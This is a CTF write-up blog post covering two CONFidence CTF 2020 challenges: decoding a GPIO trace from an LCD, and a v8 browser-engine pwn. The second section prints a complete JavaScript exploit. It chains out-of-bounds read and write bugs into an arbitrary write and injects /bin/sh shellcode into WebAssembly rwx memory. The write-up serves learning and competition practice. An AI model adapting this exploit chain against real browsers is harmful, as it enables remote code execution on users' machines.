---
title: "CONFidence CTF 2020 Writeup"
date: 2020-03-15T21:33:41+08:00
draft: false
tags: [
  "ctf",
  "cyber-security",
  "write-up",
  'chrome',
  'v8',
  'pwn',
  'hardware'
]
description: My solves for CONFidence CTF 2020 challenges
---

# GPIO Tap

## Problem

We managed to intercept some traffic on the GPIOs, can you find out what was transmitted?

[c247763a9af9c6cd281b54b61c07957b800cfa1a8b9102eee95b2887b3626f36_gpio_tap.tar](/blog/2020-03-15-confidence-ctf/GPIO_Tap/c247763a9af9c6cd281b54b61c07957b800cfa1a8b9102eee95b2887b3626f36_gpio_tap.tar) 332K

## Solution

{{< figure src="/blog/2020-03-15-confidence-ctf/GPIO_Tap/display.jpg" >}}


From the given image, we can deduce two important information:

1. A [HD44780 LCD display](https://en.wikipedia.org/wiki/Hitachi_HD44780_LCD_controller) and a raspberry pi are used.
2. The pin semantics are as the following:
   - GPIO 23 → D4
   - GPIO 17 → D5
   - GPIO 18 → D6
   - GPIO 22 → D7
   - GPIO 24 → ENABLE
   - GPIO 25 → RS

We can use this knowledge along with the [source code](https://github.com/arduino-libraries/LiquidCrystal/blob/master/src/LiquidCrystal.cpp) from the LiquidCrystal library to parse the `tap.gpio` file:

```python
with open('./tap.gpio') as f:
  data = f.read().strip()

data = data.replace('25', 'RS').replace('24', 'ENABLE').replace('23', 'D4').replace('17', 'D5').replace('18', 'D6').replace('22', 'D7')

print data

data = data.split('\n')[1:]

def read8bits(data, counter):
  output = 0
  for i in [2,1,0,3,9,8,7,10]:
    line = data[counter+i]

    if 'D' not in line:
      print 'error on line {}: {}'.format(counter+i, line)
      exit(-1)

    output += 1 if line.split(' -> ')[-1] == 'HIGH' else 0
    output = output << 1
  for i in [4,5,6,11,12,13]:
    line = data[counter+i]
    if 'ENABLE' not in line:
      print 'error on line {}: {}'.format(counter+i, line)
      exit(-1)

  return output >> 1


counter = 0
while counter < len(data):
  line = data[counter]
  if 'RS' in line:
    msg_type = 'COMMAND' if line.split(' -> ')[-1] == 'LOW' else 'WRITE'
    output = read8bits(data, counter+1)
    meaning = ''
    if msg_type == 'COMMAND' and output & 0x80 != 0:
      meaning += 'LCD_SETDDRAMADDR'+' {}'.format(output^0x80)
    elif msg_type == 'COMMAND' and output & 0x40 != 0:
      meaning += 'LCD_SETCGRAMADDR'
    elif msg_type == 'COMMAND' and output & 0x20 != 0:
      meaning += 'LCD_FUNCTIONSET'
    elif msg_type == 'WRITE':
      meaning += chr(output)
    print '{:10s}: {} ({})'.format(msg_type,hex(output),meaning)
    counter += 15
  else:
    print 'error on line {}: {}'.format(counter, line)
```

```
$ python main.py
...
COMMAND   : 0x33 (LCD_FUNCTIONSET)
COMMAND   : 0x32 (LCD_FUNCTIONSET)
COMMAND   : 0xc ()
COMMAND   : 0x28 (LCD_FUNCTIONSET)
COMMAND   : 0x6 ()
COMMAND   : 0x1 ()
COMMAND   : 0xc ()
WRITE     : 0x57 (W)
WRITE     : 0x65 (e)
WRITE     : 0x6c (l)
WRITE     : 0x63 (c)
WRITE     : 0x6f (o)
WRITE     : 0x6d (m)
WRITE     : 0x65 (e)
WRITE     : 0x20 ( )
WRITE     : 0x74 (t)
WRITE     : 0x6f (o)
WRITE     : 0x20 ( )
WRITE     : 0x70 (p)
WRITE     : 0x34 (4)
WRITE     : 0x63 (c)
WRITE     : 0x74 (t)
WRITE     : 0x66 (f)
WRITE     : 0x20 ( )
WRITE     : 0x3a (:)
WRITE     : 0x29 ())
WRITE     : 0x20 ( )
WRITE     : 0x21 (!)
WRITE     : 0x21 (!)
COMMAND   : 0x18 ()
COMMAND   : 0x18 ()
COMMAND   : 0x18 ()
COMMAND   : 0x18 ()
COMMAND   : 0x18 ()
COMMAND   : 0x18 ()
COMMAND   : 0x18 ()
COMMAND   : 0x18 ()
COMMAND   : 0x18 ()
COMMAND   : 0x18 ()
COMMAND   : 0x1 ()
COMMAND   : 0xc0 (LCD_SETDDRAMADDR 64)
WRITE     : 0x75 (u)
COMMAND   : 0x81 (LCD_SETDDRAMADDR 1)
WRITE     : 0x34 (4)
COMMAND   : 0x86 (LCD_SETDDRAMADDR 6)
WRITE     : 0x4f (O)
COMMAND   : 0x85 (LCD_SETDDRAMADDR 5)
WRITE     : 0x49 (I)
COMMAND   : 0xc2 (LCD_SETDDRAMADDR 66)
WRITE     : 0x7d (})
COMMAND   : 0x8e (LCD_SETDDRAMADDR 14)
WRITE     : 0x72 (r)
COMMAND   : 0xc1 (LCD_SETDDRAMADDR 65)
WRITE     : 0x70 (p)
COMMAND   : 0x82 (LCD_SETDDRAMADDR 2)
WRITE     : 0x7b ({)
COMMAND   : 0x87 (LCD_SETDDRAMADDR 7)
WRITE     : 0x5f (_)
COMMAND   : 0x88 (LCD_SETDDRAMADDR 8)
WRITE     : 0x74 (t)
COMMAND   : 0x80 (LCD_SETDDRAMADDR 0)
WRITE     : 0x70 (p)
COMMAND   : 0x89 (LCD_SETDDRAMADDR 9)
WRITE     : 0x34 (4)
COMMAND   : 0x83 (LCD_SETDDRAMADDR 3)
WRITE     : 0x47 (G)
COMMAND   : 0x8b (LCD_SETDDRAMADDR 11)
WRITE     : 0x5f (_)
COMMAND   : 0x8f (LCD_SETDDRAMADDR 15)
WRITE     : 0x6d (m)
COMMAND   : 0x84 (LCD_SETDDRAMADDR 4)
WRITE     : 0x50 (P)
COMMAND   : 0x8a (LCD_SETDDRAMADDR 10)
WRITE     : 0x70 (p)
COMMAND   : 0x8c (LCD_SETDDRAMADDR 12)
WRITE     : 0x77 (w)
COMMAND   : 0x8d (LCD_SETDDRAMADDR 13)
WRITE     : 0x61 (a)
```

We can see not all characters are displayed in sequential order. Instead, the `LCD_SETDDRAMADDR` command is used to determine the location of each symbol. After some sorting, we are able to retrieve the flag:

```
COMMAND   : 0x80 (LCD_SETDDRAMADDR 0)
WRITE     : 0x70 (p)
COMMAND   : 0x81 (LCD_SETDDRAMADDR 1)
WRITE     : 0x34 (4)
COMMAND   : 0x82 (LCD_SETDDRAMADDR 2)
WRITE     : 0x7b ({)
COMMAND   : 0x83 (LCD_SETDDRAMADDR 3)
WRITE     : 0x47 (G)
COMMAND   : 0x84 (LCD_SETDDRAMADDR 4)
WRITE     : 0x50 (P)
COMMAND   : 0x85 (LCD_SETDDRAMADDR 5)
WRITE     : 0x49 (I)
COMMAND   : 0x86 (LCD_SETDDRAMADDR 6)
WRITE     : 0x4f (O)
COMMAND   : 0x87 (LCD_SETDDRAMADDR 7)
WRITE     : 0x5f (_)
COMMAND   : 0x88 (LCD_SETDDRAMADDR 8)
WRITE     : 0x74 (t)
COMMAND   : 0x89 (LCD_SETDDRAMADDR 9)
WRITE     : 0x34 (4)
COMMAND   : 0x8a (LCD_SETDDRAMADDR 10)
WRITE     : 0x70 (p)
COMMAND   : 0x8b (LCD_SETDDRAMADDR 11)
WRITE     : 0x5f (_)
COMMAND   : 0x8c (LCD_SETDDRAMADDR 12)
WRITE     : 0x77 (w)
COMMAND   : 0x8d (LCD_SETDDRAMADDR 13)
WRITE     : 0x61 (a)
COMMAND   : 0x8e (LCD_SETDDRAMADDR 14)
WRITE     : 0x72 (r)
COMMAND   : 0x8f (LCD_SETDDRAMADDR 15)
WRITE     : 0x6d (m)
COMMAND   : 0xc0 (LCD_SETDDRAMADDR 64)
WRITE     : 0x75 (u)
COMMAND   : 0xc1 (LCD_SETDDRAMADDR 65)
WRITE     : 0x70 (p)
COMMAND   : 0xc2 (LCD_SETDDRAMADDR 66)
WRITE     : 0x7d (})
```

flag: `p4{GPIO_t4p_warmup}`

# Chromatic Aberration

## Problem

Pwn our chrome for fun and profit.

Ok, it's not really Chrome, but it's close enough.

Let's say, it's chromatic

The memory limit is 64MB

`nc chromatic-aberration.zajebistyc.tf 31004`

## Solution

This is the first browser pwn challenge that I solved, and I learned a lot from this experience. I relied on both past writeups and the **v8** source code to solve the challenge. Here are just a few resources that helped me out during the process:

- [m1ghtym0/browser-pwn](https://github.com/m1ghtym0/browser-pwn#chromium-pwn)
- [Exploiting v8: *CTF 2019 oob-v8](https://syedfarazabrar.com/2019-12-13-starctf-oob-v8-indepth/)
- [\*CTF 2019 oob-v8](https://changochen.github.io/2019-04-29-starctf-2019.html)

### Identifying the bugs

Looking at the `diff.diff` file, we can see two bugs being introduced into the v8 javascript engine.

The first bug is an out-of-bound read from any string objects:

```
$ ./bin/d8
V8 version 8.1.307.20
d8> var a = new String();
undefined
d8> a.charCodeAt(1000);
116
```

The second bug is an out-of-bound write in the `fill` method of a TypedArray:

```
d8> var b = new Uint8Array([0]);
undefined
d8> b.fill(0xff, 1000,1001);
0
```

### From OOB RW to RCE

From previous readings, I learned that for every WebAssembly instance, v8 will allocate a `rwx` memory region. With an arbitrary write, we can inject shellcode to this region and execute it using the WebAssembly instance.

With this in mind, our plan becomes:

1. leak the memory address of the `rwx` region
2. obtain an arbitrary write to load our shellcode
3. execute the shellcode

#### Memory leaking with OOB read

Utilizing the OOB read that we have, we can leak any value on the heap given its offset.

`d8` has this useful flag `--allow-natives-syntax` which allows us to use the `%DebugPrint` function to inspect javascript objects and get their addresses in memory. Pairing this with `gdb`, we can find the offsets between objects with relative ease.

> One thing to note is that v8 uses the last bit of each value to indicate if it is a pointer, so always do `ptr-1` when viewing object memory in `gdb`.

From previous writeups, we know that the address of the `rwx` region is referenced at `wasm_instance_addr+0x68`; therefore, if we obtain the offset between the string object and the wasm instance, we can combine the two and leak the address of the `rwx` region:

```
d8> const wasm_code = new Uint8Array([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x85, 0x80, 0x80, 0x80, 0x00, 0x01, 0x60, 0x00, 0x01, 0x7f, 0x03, 0x82, 0x80, 0x80, 0x80, 0x00, 0x01, 0x00, 0x06, 0x81, 0x80, 0x80, 0x80, 0x00, 0x00, 0x07, 0x85, 0x80, 0x80, 0x80, 0x00, 0x01, 0x01, 0x61, 0x00, 0x00, 0x0a, 0x8a, 0x80, 0x80, 0x80, 0x00, 0x01, 0x84, 0x80, 0x80, 0x80, 0x00, 0x00, 0x41, 0x00, 0x0b]);
d8> var a = new String('helloworld');
d8> const wasm_instance = new WebAssembly.Instance(new WebAssembly.Module(wasm_code));
d8> %DebugPrint(a)
DebugPrint: 0x379b08084075: [JSPrimitiveWrapper]
 ...
 - value: 0x379b0820f501 <String[#10]: helloworld>  ← the string pointer points to this address +12
...
helloworld
d8> %DebugPrint(wasm_instance)
DebugPrint: 0x379b0820f829: [WasmInstanceObject] in OldSpace
...
[object WebAssembly.Instance]
d8> ^C
...
gef➤  der 0x379b0820f829-1                          ← wasm_instance
0x0000379b0820f828│+0x0000: 0x080406e908243169
...
0x0000379b0820f890│+0x0068: 0x00002a4e747c7000      ← rwx region address that we are looking for
```

In this case, the offset between the string object and the `rwx` region address is `(0x379b0820f829-1+0x68)-(0x379b0820f501-1+12) == 900`. With this, we get the code below:

```javascript
var m1 = 0, m2 = 0, offset=0;
for (let j = -256; j < 256; j+=4) {
  m1 = 0, m2 = 0;
  for (let i = 0; i < 4; i++) {
    m1 += a.charCodeAt(GENERAL_OFFSET+j+i) << (8*i);
  }
  for (let i = 0; i < 4; i++) {
    m2 += a.charCodeAt(GENERAL_OFFSET+j+4+i) << (8*i);
  }
  if (m2 !== 0 && m1 !== 0 && (m1&0xfff) === 0 && (m1&0x1000) === 0x1000) {
    offset = 3896+j;
    console.log('found: '+offset);
    break;
  }
}
let rwx_addr = [m2,m1];
console.log('rwx_addr: '+hex(...rwx_addr));
```

> I included an extra loop to search for the correct address around the general_offset becuase the offset varies a bit between executions.

#### Leveling up OOB write to arbitrary write

Now with the `rwx` region address in hand, we need a way to write to it.

From previous writeups, the solution seems to be using an `ArrayBuffer` plus `DataView`; however, I can't get it to work likely due to changes in the v8 engine.

In the end, I used a `TypedArray`. By modifying its `external_pointer`, I am able to achieve an arbitrary write. I found this method by reading the v8 source code:

```c++
// https://github.com/v8/v8/blob/4b9b23521e6fd42373ebbcb20ebe03bf445494f9/src/elements.cc
static Object FillImpl(Handle<JSObject> receiver, Handle<Object> obj_value,
                       uint32_t start, uint32_t end) {
  Handle<JSTypedArray> array = Handle<JSTypedArray>::cast(receiver);
  DCHECK(!array->WasDetached());
  DCHECK(obj_value->IsNumeric());

  ctype value = BackingStore::FromHandle(obj_value);

  // Ensure indexes are within array bounds
  CHECK_LE(0, start);
  CHECK_LE(start, end);
  CHECK_LE(end, array->length_value());

  DisallowHeapAllocation no_gc;
  BackingStore elements = BackingStore::cast(receiver->elements());
  ctype* data = static_cast<ctype*>(elements->DataPtr()); // ← the location to fill is determined by DataPtr
  std::fill(data + start, data + end, value);
  return *array;
}

// https://github.com/v8/v8/blob/4b9b23521e6fd42373ebbcb20ebe03bf445494f9/src/objects/fixed-array-inl.h
void* FixedTypedArrayBase::DataPtr() {
  return reinterpret_cast<void*>(
      base_pointer()->ptr() + reinterpret_cast<intptr_t>(external_pointer())); // ← DataPtr = base_pointer + external_pointer
}
```

In the code below, I allocated two TypedArrays next to each other. I used the OOB write from the first one to change the `external_pointer` of the second one. After the modification, `buffer` will be able to write to the `rwx` region.

> Offsets used here are found using the same method as above (`%DebugPrint` + `gdb`)

```javascript
var d = new Uint8Array([0]);
var buffer = new Uint8Array([0]);

let other = (BigInt(rwx_addr[0])<<32n)+BigInt(rwx_addr[1])-0x80804edn;
other = [Number(other >> 32n), Number(other & 0xffffffffn)];


[m1, m2] = other;
for (let i = 0; i < 4; i++) {
  d.fill(m1&0xff, 164+0x28+4+i, 164+0x28+4+i+1);
  m1 >>= 8;
}
for (let i = 0; i < 4; i++) {
  d.fill(m2&0xff, 164+0x28+i, 164+0x28+i+1);
  m2 >>= 8;
}
```

#### Shellcode and profit!

Lastly, we use the arbitrary write to inject shellcode into the `rwx` region and trigger it with the wasm_instance. It looks something like this in code:

```javascript
var shellcode = [106, 104, 72, 184, 47, 98, 105, 110, 47, 47, 47, 115, 80, 72, 137, 231, 104, 114, 105, 1, 1, 129, 52, 36, 1, 1, 1, 1, 49, 246, 86, 106, 8, 94, 72, 1, 230, 86, 72, 137, 230, 49, 210, 106, 59, 88, 15, 5, 144, 144, 144, 144];
for (let i = 0; i < shellcode.length; i++) {
  buffer.fill(shellcode[i], i, i+1);
}

wasm_func();
```

### Final exploit

Here is the full exploit script:

```javascript
let array_buf = new ArrayBuffer(8);
let buf_view = new DataView(array_buf);

function f2i(f) {
  buf_view.setFloat64(0, f);
  return [buf_view.getUint32(0), buf_view.getUint32(4)];
}

function i2f(a, b) {
  buf_view.setUint32(0, a);
  buf_view.setUint32(4, b);
  
  return buf_view.getFloat64(0);
}

function gc() {
  for (let i = 0; i < 0x10; i++) { new ArrayBuffer(0x1000000); }
}


function hex(a, b) {
  a = '00000000'+a.toString(16);
  b = '00000000'+b.toString(16);
  a = a.substring(a.length-8,a.length);
  b = b.substring(b.length-8,b.length);
  return '0x'+a+b;
}

gc();

const wasm_code = new Uint8Array([
  0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
  0x01, 0x85, 0x80, 0x80, 0x80, 0x00, 0x01, 0x60,
  0x00, 0x01, 0x7f, 0x03, 0x82, 0x80, 0x80, 0x80,
  0x00, 0x01, 0x00, 0x06, 0x81, 0x80, 0x80, 0x80,
  0x00, 0x00, 0x07, 0x85, 0x80, 0x80, 0x80, 0x00,
  0x01, 0x01, 0x61, 0x00, 0x00, 0x0a, 0x8a, 0x80,
  0x80, 0x80, 0x00, 0x01, 0x84, 0x80, 0x80, 0x80,
  0x00, 0x00, 0x41, 0x00, 0x0b
]);
var a = new String('helloworld');
const wasm_instance = new WebAssembly.Instance(new WebAssembly.Module(wasm_code));

const wasm_func = wasm_instance.exports.a;

var d = new Uint8Array([0]);
var buffer = new Uint8Array([0]);


var m1 = 0, m2 = 0, offset=0;
for (let j = -256; j < 256; j+=4) {
  m1 = 0, m2 = 0;
  for (let i = 0; i < 4; i++) {
    m1 += a.charCodeAt(3340+j+i) << (8*i);
  }
  for (let i = 0; i < 4; i++) {
    m2 += a.charCodeAt(3340+j+4+i) << (8*i);
  }
  if (m2 !== 0 && m1 !== 0 && (m1&0xfff) === 0 && (m1&0x1000) === 0x1000) {
    offset = 3896+j;
    console.log('found: '+offset);
    break;
  }
}


let rwx_addr = [m2,m1];
console.log('rwx_addr: '+hex(...rwx_addr));

let other = (BigInt(rwx_addr[0])<<32n)+BigInt(rwx_addr[1])-0x80804edn;
other = [Number(other >> 32n), Number(other & 0xffffffffn)];


[m1, m2] = other;
for (let i = 0; i < 4; i++) {
  d.fill(m1&0xff, 164+0x28+4+i, 164+0x28+4+i+1);
  m1 >>= 8;
}
for (let i = 0; i < 4; i++) {
  d.fill(m2&0xff, 164+0x28+i, 164+0x28+i+1);
  m2 >>= 8;
}

var shellcode = [106, 104, 72, 184, 47, 98, 105, 110, 47, 47, 47, 115, 80, 72, 137, 231, 104, 114, 105, 1, 1, 129, 52, 36, 1, 1, 1, 1, 49, 246, 86, 106, 8, 94, 72, 1, 230, 86, 72, 137, 230, 49, 210, 106, 59, 88, 15, 5, 144, 144, 144, 144];
for (let i = 0; i < shellcode.length; i++) {
  buffer.fill(shellcode[i], i, i+1);
}

wasm_func();
```


flag: `p4{c0mPIling_chr@mium_1s_h4rd_ok?}`